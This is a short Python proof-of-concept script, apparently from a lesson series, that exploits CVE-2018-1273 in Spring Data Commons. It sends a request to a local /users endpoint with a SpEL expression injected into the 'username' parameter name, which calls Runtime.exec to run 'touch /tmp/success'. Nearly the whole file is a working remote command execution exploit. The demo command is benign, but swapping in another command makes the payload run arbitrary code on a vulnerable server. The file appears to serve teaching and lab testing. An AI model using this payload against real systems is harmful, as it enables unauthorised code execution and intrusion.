# 课程027_ Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）
import requests

SPRING_DATA_KEY = 'http://localhost:8080/users?'
params = {
    'page': 1,
    'size': 5,
    'password': '',
    'repeatePassword': '',
    'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]': ''
}
res = requests.get(url=SPRING_DATA_KEY, params=params)
print(res.text)
